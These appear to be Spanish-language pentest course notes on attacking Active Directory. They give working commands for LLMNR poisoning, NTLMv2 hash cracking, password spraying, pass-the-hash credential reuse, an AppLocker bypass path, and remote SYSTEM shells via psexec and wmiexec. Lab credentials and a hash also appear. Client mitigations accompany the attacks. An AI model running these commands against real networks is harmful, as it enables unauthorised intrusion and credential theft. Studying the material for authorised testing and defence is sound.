### Active Directory

**Herramientas**

- [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) 
- [kerbrute](https://github.com/ropnop/kerbrute)
- [Usernames Estadisticamente Probables](https://github.com/insidetrust/statistically-likely-usernames)
- [linkedin2username](https://github.com/initstring/linkedin2username)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) / [SharpView](https://github.com/dmchell/SharpView) - PowerShell y .NET para reconocimiento en AD, alternativa a comandos net*.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Mapea relaciones de AD para planear rutas de ataque, usa Neo4j para análisis gráfico.
- [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) - Colector en C# para obtener información de AD (usuarios, grupos, ACLs, GPOs, etc.).
- [BloodHound.py](https://github.com/fox-it/BloodHound.py) - Ingestor en Python basado en Impacket para recolectar datos de AD.
- [Kerbrute](https://github.com/ropnop/kerbrute) - Enumeración de cuentas AD y ataques de password spraying/bruteforce vía Kerberos.
- [Impacket toolkit](https://github.com/SecureAuthCorp/impacket) - Colección de scripts en Python para interactuar y atacar protocolos de red.
- [Responder](https://github.com/lgandx/Responder) - Envenenamiento LLMNR, NBT-NS y MDNS.
- [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) - Herramienta PowerShell para spoofing y envenenamiento de red.
- [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) - Versión en C# de Inveigh con consola interactiva.
- [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo) - Consulta servicios RPC disponibles en un host.
- [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) - Cliente de RPC en Linux (parte de Samba) para tareas de enumeración AD.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Toolkit para enumeración, ataques y post-explotación en AD.
- [Rubeus](https://github.com/GhostPack/Rubeus) - Herramienta en C# para abuso de Kerberos.
- [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) - Script de Impacket para encontrar SPNs de usuarios normales.
- [Hashcat](https://hashcat.net/hashcat/) - Crackeo de hashes y recuperación de contraseñas.
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) - Enumeración de Windows y Samba.
- [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) - Reimplementación de enum4linux.
- [ldapsearch](https://linux.die.net/man/1/ldapsearch) - Cliente integrado para interactuar con LDAP.
- [windapsearch](https://github.com/ropnop/windapsearch) - Script Python para consultas LDAP en AD.
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) - Password spraying en PowerShell contra usuarios de dominio.
- [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) - Funciones PowerShell para auditar/atacar LAPS en AD.
- [smbmap](https://github.com/ShawnDEvans/smbmap) - Enumeración de shares SMB en dominios.
- [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Impacket: shell semi-interactiva tipo Psexec.
- [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) - Impacket: ejecución de comandos vía WMI.
- [Snaffler](https://github.com/SnaffCon/Snaffler) - Busca credenciales u otros datos sensibles en shares accesibles.
- [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) - Servidor SMB simple para transferir archivos.
- [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) - Gestiona SPNs de cuentas de servicio en AD.
- [Mimikatz](https://github.com/ParrotSec/mimikatz) - Extracción de credenciales, tickets Kerberos, pass-the-hash, etc.
- [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) - Impacket: volcado remoto de SAM y LSA.
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) - Shell interactiva sobre WinRM.
- [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) - Cliente MSSQL de Impacket.
- [noPac](https://github.com/Ridter/noPac) - Exploit de CVE-2021-42278 y CVE-2021-42287 para escalar a DA.
- [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) - Impacket: mapea endpoints RPC.
- [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) - PoC de PrintNightmare en Python.
- [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) - Impacket: ataques de relay SMB.
- [PetitPotam](https://github.com/topotam/PetitPotam) - PoC CVE-2021-36942 para coerción de autenticación.
- [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) - Manipulación de certificados y TGTs.
- [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) - Obtención de PACs mediante U2U.
- [adidnsdump](https://github.com/dirkjanm/adidnsdump) - Enumeración/dump de registros DNS en AD.
- [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) - Extrae credenciales de archivos de GPP.
- [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) - Impacket: ataque ASREPRoasting para obtener hashes AS-REP.
- [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) - Fuerza bruta de SIDs.
- [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) - Creación de tickets Kerberos (Golden Ticket, child-to-parent, etc.).
- [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) - Impacket: escalada de privilegios child-to-parent domain.
- [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) - Visualizador/editor de AD, permite snapshots para análisis offline.
- [PingCastle](https://www.pingcastle.com/documentation/) - Auditoría de seguridad AD con enfoque de riesgo/madurez.
- [Group3r](https://github.com/Group3r/Group3r) - Auditoría y búsqueda de malas configuraciones en GPOs.
- [ADRecon](https://github.com/adrecon/ADRecon) - Recolector de datos AD con exportación en Excel para análisis.


__________________________________

### Enumeración Inicial

```
# Visualizar y Capturar Actividad en la Red
sudo -E wireshark
sudo tcpdump -i ens224
sudo responder -I ens224 -A 

# Enumeración de la Red
fping -asgq 172.16.5.0/23 (a objetivos vivos, s imprimir estadisticas, g generar lista de objetivos CIDR, q mostrar todos los resultados)
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum



```

### Identificación de Host/Red

```
# Escuchar la red (Puede ser util filtrando por protocolos ej:ARP - Saber que host estan activos (Anotarlos))

sudo -E wireshark  -Iniciar Wireshark

sudo tcpdump -i ens224  -Escuchar la red con tcpdump

sudo responder -I ens224 -A  -Ver flujo de sesiones (Sin envenenar)

# Barrido de ping (Descubrimiento de Host por Protocolo ICMP)

fping -asgq 172.16.5.0/23
  -a Hosts vivos
  -s Mostrar estadisticas
  -g Generar lista de objetivos a partir de la red CIDR
  -q No mostrar resultados por objetivo

nmap -sn <IP>

# Identificación de servicios en Hosts

sudo nmap -v -A -iL hosts.txt -oN host-enum.nmap -Escanep agresivo a lista de IPs
```

### Identificaión de Usuarios (Interno)

```
# Kerbrute - Enumeración interna de nombres de usuario de AD

--------------
Install GO

 go install github.com/ropnop/kerbrute@latest

--------------
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make all
sudo cp dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute
kerbrute --help

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
kerbrute_linux_amd64 passwordspray --dc 3.149.246.12 -d spartancybersec.corp ./users.txt Password@1  -Password Spraying

```

### Identificación de Posibles Vulnerabildiades

```
MS08-067, EternalBlue, or BlueKeep
SeImpersonate con JuiciPotatoe
Psexec
BloodHound
PowerView
Kerberoasting / ASREPRoasting
Inveigh to gather Net-NTLMv2
SMB relay
ACL attacks
```
__________________________________________________________________________

> LLMNR y NBT-NS son protocolos de resolución de nombres que Windows utiliza cuando falla el DNS. El problema es que cualquier equipo en la red puede responder a estas solicitudes, lo que permite ataques de tipo Man-in-the-Middle. Un atacante puede aprovechar esta vulnerabilidad para suplantar identidades de red, capturar hashes de contraseñas (NetNTLM) y, en algunos casos, obtener credenciales en texto claro o realizar ataques SMB Relay para acceso no autorizado.

### LLMNR/NBT-NS Poisoning - from Linux

```
#RESPONDER
Responder se debe ejecutar con privilegios de root e idealmente tener nuestro host habilitado estos puertos "UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353"

sudo responder -I ens224 #Inicia Responder en una interfaz de red
```
### Descifrar Hash NTLMv2 con HashCat (Capturado con Responder)
```
hashcat -m 5600 forend_ntlmv2.txt /usr/share/wordlists/rockyou.txt
```
### LLMNR/NBT-NS Poisoning - from Windows
> En Mitre ATT&CK esta tecnica se identifica como **T1557.001** _Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay_

```
#Inveigh
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y #Suplantacion de LLMNR y NBNS, ingreso a consola y la salida va a un archivo

Tambien hay una version en C la cual es mas estable y actualizada, pero se debe compilar primero en VisualStudio

PS C:\htb> .\Inveigh.exe #Este nos permite consultar durante la ejecucuion
    "ESC" > GET NTLMV2UNIQUE #Para ver los hashes unicos capturados o cualquier otro con > HELP (GET NTLMV2USERNAMES, )
```
**RECOMENDACIONES PARA EL CLIENTE**

Desabilitar LLMNR y NBT-NS `We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."`, pero aclarandole al cliente que debe tener precaucion y verificar que estos cambios no afecten al sistema
Para NBT-NS no se puede desactivar a través de la Política de grupo, pero debe desactivarse localmente en cada host
Monitorear los puertos UDP 5355 y 137, y los ID de eventos 4697 y 7045 ya que están asociados a LLMNR y NBT-NS respectivamente


________________________________________________________________

## Password Spraying

> Password spraying es una técnica que consiste en probar una o pocas contraseñas comunes contra una gran cantidad de usuarios, evitando así los bloqueos automáticos por intentos fallidos. A diferencia de un ataque de fuerza bruta tradicional, es más sigiloso y efectivo, especialmente en redes internas, y puede permitir obtener acceso inicial a sistemas. Sin embargo, aún existe riesgo de bloqueo de cuentas, por lo que debe ejecutarse con retrasos entre intentos y teniendo en cuenta la política de contraseñas del dominio.

> Para esto primero se deben tener nombres de cuentas por lo cual se puede usar una lista de [Usuarios estadisticamente probables](https://github.com/insidetrust/statistically-likely-usernames) y se puede combinar con enumeracion OSINT ej: Usuarios obtenidos de Linkedin y probandolos con la herramienta de **Kerbrute**. Para obtener privilegios administrativos o los suficientes para poder hacer enumeracion con BloodHound

### Enumerating & Retrieving Password Policies
#### Enumerating the Password Policy - from Linux - Credentialed

> Antes de hacer un Password Spraying es recomendable conocer la politica de contraseñas, ya que en caso de que a cierta cantidad de intentos se bloqueen las cuentas y solo las pueda desbloquear un administrador manualmente, estariamos generando una gran indisponibilidad al cliente. Igual si el tiempo de bloqueo es muy largo

```
#Averiguar politica de contraseñas con Crackmapexec o Netexec -Con credenciales
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Enumerar politica de contraseñas con SMB con una Null Session
rpcclient -U "" -N 172.16.5.5
    > querydominfo #Sirve para verificar el acceso a una Null Session, ademas de enumerar algo de la Politica de Contraseñas

enum4linux -P 172.16.5.5 # Enumerar informacion sobre politicas
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

#### Enumerating Null Session - from Windows
Confirmar sesiones nulas desde windows
```PowerShell
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.
```

#### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

#### Enumerating the Password Policy - from Windows
> La politica de contraseñas se podria obtener igualemnte a traves de PowerView, CrackMapExec portado a Windows, SharpMapExec, SharpView, etc. Unicamente si el cliente permite el acceso a internet o a estas herramientas. Si no:
```
C:\htb> net accounts

PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

### Password Spraying - Making a Target User List

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" #Filtrado de unicamente cuentas de usuario

rpcclient -U "" -N 172.16.5.5
    > enumdomusers

crackmapexec smb 172.16.5.5 --users #Enumera usuarios e indica Intentos de inicio de sesion (badpwdcount ) y la fecha del ultimo intento (baddpwdtime) 
```

#### Gathering Users with LDAP Anonymous
> Se puede hacer enumeracion de cuentas de usuario con Windapsearch o LDAPSearch si se tiene un acceso anonimo a LDAP
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" " #Comando de enumeracion con filtrado unicamente de usuarios

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U #U Filtra por usuarios. Aunque es ideal conocer las filtros de busqueda de LDAP

```

#### Enumerating Users with Kerbrute
> Kerbrute permite enumerar usuarios válidos en Active Directory aprovechando la preautenticación de Kerberos. Si un usuario es válido, el KDC (controlador de dominio) pedirá autenticación previa; si no lo es, responderá con “PRINCIPAL UNKNOWN”. Esta técnica no genera eventos de error visibles (como el 4625) ni bloquea cuentas, lo que la hace rápida y sigilosa. Sin embargo, si se usa para password spraying, los intentos fallidos sí pueden causar bloqueos, por lo que debe usarse con precaución.

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt #Enumeracion de usuarios con la lista de Usuarios estadisticamente Probables

```

#### Credentialed Enumeration to Build our User List

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```
__________________________________________________________________________

## Spray Responsibly

### Internal Password Spraying from a Linux Host
**Internal Password Spraying from a Linux Host**

```bash
# Se usa rpcclient y se prueban todos los usuarios con una contrasñea y se filtra por el acceso valido "Authority Name"
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Esto mismo se puede realizar con Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

# Igualmente con Crackmapexec ya que este recibe una lista como usuario o contraseña
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Luego con este mismo se validan las credenciales capturadas
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

```

### Local Administrator Password Reuse
> La reutilización de contraseñas de administrador local es común en redes corporativas y representa un riesgo elevado. Si un atacante obtiene el hash o contraseña de una cuenta local privilegiada, puede usar herramientas como CrackMapExec para intentar ese mismo acceso en múltiples hosts, ya que muchos comparten la misma contraseña. Esta técnica permite obtener acceso administrativo en varios sistemas. Aunque es efectiva, es ruidosa y no recomendada en evaluaciones que requieran sigilo. La solución recomendada es implementar LAPS, que asigna contraseñas locales únicas y rotativas desde Active Directory.

```
Suponiendo que unicamente se pudo obtener el Hash NTLM del SAM Local, se hace una autenticacion en todos los host disponibles en busca de otro host con reutilizacion de credenciales. Cabe resaltar que es una tecnica Ruidosa

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
      --local-auth # Indica a la herramienta que solo debe autenticarse una vez en cada maquina
```

**RECOMENDACIONES CLIENTE**

Una forma de solucionar este problema es utilizar la herramienta gratuita de Microsoft Solución de contraseña de administrador local (LAPS) hacer que Active Directory administre las contraseñas de los administradores locales y aplique una contraseña única en cada host que gire en un intervalo establecido.


**Internal Password Spraying - from Windows**

Herramienta que extrae la lista de todos los usuarios del dominio: [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray), en esta se debe estar autenticado o estar en un dispositivo fisico

```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
Desde un host Windows unido a un dominio, es posible realizar pulverización de contraseñas usando herramientas como DomainPasswordSpray.ps1, que permite probar una contraseña contra muchos usuarios de AD respetando la política de bloqueo. Esta técnica es útil para obtener credenciales sin causar bloqueos.

Mitigaciones clave:

- MFA, restricción de acceso, buenas prácticas de contraseñas, segmentación de red.

- Detección: monitoreo de eventos 4625 y 4771 en los controladores de dominio.

____________________________________________________________________________-
## Deeper Down the Rabbit Hole

### Enumerating Security Controls

#### 1. Objetivo
Tras obtener acceso inicial, se enumeran controles de seguridad en el dominio para:
- Evaluar defensas activas.
- Adaptar herramientas y técnicas de post-explotación.
- Identificar posibles rutas de evasión.

#### 2. Windows Defender
- Herramienta usada: `Get-MpComputerStatus`
- Protección en tiempo real: `RealTimeProtectionEnabled = True`
- Bloquea herramientas comunes como PowerView.

#### 3. AppLocker
- Controla qué apps pueden ejecutarse.
- Cmd y PowerShell a menudo están bloqueados.
- Bypasses comunes: usar otras rutas como:
  - `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`

- **Comando útil:** `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

#### 4. PowerShell Constrained Language Mode
- Modo restringido limita capacidades como COM, .NET, clases, etc.
- Comando de verificación: `$ExecutionContext.SessionState.LanguageMode`
- Ejemplo de salida: `ConstrainedLanguage`

#### 5. LAPS (Local Administrator Password Solution)
- Administra contraseñas locales únicas por host.
- Objetivo del atacante: encontrar usuarios que puedan leer contraseñas.

#### Herramientas útiles:
- `Find-LAPSDelegatedGroups` → muestra grupos con permisos LAPS.
- `Find-AdmPwdExtendedRights` → identifica usuarios con "All Extended Rights".
- `Get-LAPSComputers` → muestra equipos con LAPS, expiración y contraseñas (si hay acceso).


### Credentialed Enumeration - from Linux

Usando crackmapexec o netexec (que es una herramienta que integra funciones de Impacket y de PoweSploit) podemos hacer una enumeracion de usuarios si tenemos una cuenta de usuario valida, este ataque va dirigido al Controlador de Dominio, ya que este es el que contiene toda la información de los usuarios y demas.

**CrackMapExec**
```
#Enumeracion de usuarios e informacion de politicas de contraseña
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
  SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
------------------------------------------------------------------

#Enumeracion de grupos de dominio
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
------------------------------------------------------------------

#Enumeracion de usuarios conectados
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
  SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
------------------------------------------------------------------

#Enumerar permisos en recursos compartidos
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
  SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share
------------------------------------------------------------------

#Uso de Spider-plus para explotar todos los recursos accesibles (Explorará cada recurso compartido legible en el host y enumerará todos los archivos legibles)
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
  SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus

```
**SMBMap**
Se utiliza para recopilar una lista de recursos compartidos, permisos y contenidos compartidos. Una vez obtenido el acceso, se puede utilizar para descargar y cargar archivos y ejecutar **comandos remotos**. Además de enumerar acciones, podemos usar SMBMap para enumerar directorios de forma recursiva, enumerar el contenido de un directorio, buscar el contenido de archivos y más. 
```
#Mapeo y comprobacion de acceso inicial
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
---------------------------------------

#Enumeracion recursiva de sub/directorios
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

**RPCClient**
Es una herramienta útil creada para usarse con el protocolo Samba y para brindar funcionalidad adicional a través de MS-RPC. Puede enumerar, agregar, cambiar e incluso eliminar objetos de AD.



```
#Acceso no autenticado a rpcclient
rpcclient -U "" -N 172.16.5.5
```
En una enumeración con rpcclient, los RIDs (identificadores relativos) permiten identificar de forma única a los objetos dentro de un dominio al combinarse con el SID del dominio. Esto es útil para la enumeracion porque algunos RIDs son estáticos y predecibles, como el RID 500 para la cuenta de Administrador, lo que permite enumerar usuarios clave y obtener información sensible del dominio, incluso sin conocer previamente sus nombres. Esta técnica es esencial para identificar objetivos valiosos dentro de un entorno Active Directory.

```
#Enumeracion de usuarios por RID
rpcclient $> queryuser 0x457

#Enumerar todos los usuarios del dominio
rpcclient $> enumdomusers
```

#### Impacket Toolkit
Impacket es un conjunto de herramientas versátil que nos proporciona muchas formas diferentes de enumerar, interactuar y explotar los protocolos de Windows y encontrar la información que necesitamos usando Python. La herramienta se mantiene activamente y tiene muchos contribuyentes, especialmente cuando surgen nuevas técnicas de ataque. 

**Psexec.py**
psexec.py es una herramienta de Impacket que permite ejecutar comandos de forma remota como NT AUTHORITY\SYSTEM en un host Windows, utilizando credenciales válidas. A diferencia del PsExec original, esta versión sube un ejecutable aleatorio al recurso compartido ADMIN$, crea un servicio remoto a través de RPC, y luego se comunica mediante un named pipe, ofreciendo una shell interactiva como SYSTEM. Es útil para moverse lateralmente dentro de un entorno Windows tras obtener credenciales válidas.
```
#Generar shell con credenciales de administrador local (whoami --> Authority\System)
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

**wmiexec.py**
wmiexec.py es una herramienta de Impacket que permite ejecutar comandos en un host Windows de forma remota y sigilosa, utilizando WMI (Windows Management Instrumentation). A diferencia de psexec.py, no sube archivos ni crea servicios, lo que reduce el rastro que deja en el sistema. El shell es semiinteractivo, ejecutando un nuevo cmd.exe por cada comando, y se ejecuta con el contexto del usuario autenticado, no como SYSTEM. Es útil para evadir detección básica, aunque puede generar eventos 4688 por cada ejecución. Ideal para movimientos laterales más discretos tras obtener credenciales válidas.

```
#Generar shell semi interactiva
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 
```
**Windapsearch**
Script útil de Python que podemos usar para enumerar usuarios, grupos y computadoras de un dominio de Windows mediante consultas LDAP
```

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

--da (enumerar a los miembros del grupo de administradores de dominio)
-PU (encontrar usuarios con privilegios excesivos por grupo anidado/memebership) 
```
**Bloodhound.py**

BloodHound.py es un ingestor de BloodHound escrito en Python que permite recolectar datos de Active Directory desde un host Linux, usando credenciales válidas de dominio. Es ideal cuando no se tiene acceso a un host Windows para ejecutar el colector SharpHound. Recoge información crítica como usuarios, grupos, ACLs, sesiones, permisos de RDP/WinRM, etc., y genera archivos JSON que se cargan en la interfaz gráfica de BloodHound para identificar rutas de ataque y relaciones entre objetos del dominio. Es una herramienta esencial para pentesters, ya que automatiza y visualiza caminos complejos de escalada de privilegios y movimientos laterales.

Un recurso util son las [Consultas personalizadas de Cypher](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

```
#Ejecutar bloodhound con "all" para recuperar la mayor cantidad de datos posibles en formato json
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
zip -r ilfreight_bh.zip *.json

#Instalar BloodHound [Kali](https://www.kali.org/tools/bloodhound/) 
sudo apt install -y bloodhound
sudo bloodhound-setup (sudo neo4j start)
  username: neo4j
  password: neo4j
bloodhound

zip -r ilfreight_bh.zip *.json #Se comprimen todos los archivos json encontrados anteriormente
  Upload Data #Seleccionar la opcion y cargar el .zip
   


```













